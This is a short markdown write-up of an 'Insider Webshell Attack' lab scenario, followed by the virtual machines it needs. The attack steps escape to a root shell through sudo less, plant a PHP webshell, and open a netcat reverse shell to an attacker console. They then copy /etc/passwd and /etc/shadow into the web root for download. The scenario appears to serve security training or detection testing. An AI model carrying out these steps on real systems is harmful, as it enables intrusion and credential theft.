Insider Webshell Attack
=======================

The Attack
------------------
>1. Login with magnifier on ubuntu-web-pr
>2. Check Sudo Permissions - sudo -l
>3. Create file - touch lesser.txt
>4. Use less - sudo less lesser.txt
>5. Less Exploit - !/bin/sh
>6. Modify getevil.php with Malicious Code
>7. Web Browser to http://ubuntu-web-pr/getevil.php
>8. Web Browser to http://ubuntu-web-pr/evil.php
>9. From evil.php on ubuntu-web-pr Get Reverse Shell - See Reverse Shell Wget
>10. On Remote Attack Console Box Open NetCat Listeners 
>	- Terminal #1 - nc -nvlp 443
>11. Web Browser Tab #1 to http://<ubuntu-web-pr>/reverse-shell.php?ip=<consoleIP>&port=443
>12. On ubuntu-web-pr - whoami
>13. On ubuntu-web-pr - sudo -i
>14. On ubuntu-web-pr - whoami
>15. On ubuntu-web-pr - cp /etc/passwd /var/www/html
>16. On ubuntu-web-pr - cp /etc/shadow /var/www/html
>17. On ubuntu-web-pr - chown apache:apache /var/www/html/shadow
>18. On ubuntu-web-pr - chown apache:apache /var/www/html/passwd
>19. Web Browser to http://ubuntu-web-pr/passwd
>20. Web Browser to http://ubuntu-web-pr/shadow
>21. On ubuntu-web-pr - rm /var/www/html/passwd
>22. On ubuntu-web-pr - rm /var/www/html/shadow


Environment
-----------
**Two Web Servers:** Ubuntu 20.04.1
>VSphere:
>	CPU: 1 
>	Memory: 4 GB
>	Disk: 20 GB
>AWS:
>  t2.micro
>Default Packages Needed: 
>	- cron
>	- rsync
>	- sudo
>	- less
>	Install Apache with PHP on Both Servers:
>	- sudo apt install php libapache2-mod-php
  
**Attacker Remote Console**
>VSphere:
>	CPU: 1 
>	Memory: 4 GB
>	Disk: 20 GB
>AWS:
>  t2.micro
  
**Attacker Remote**
>Any machine with a webbrowser
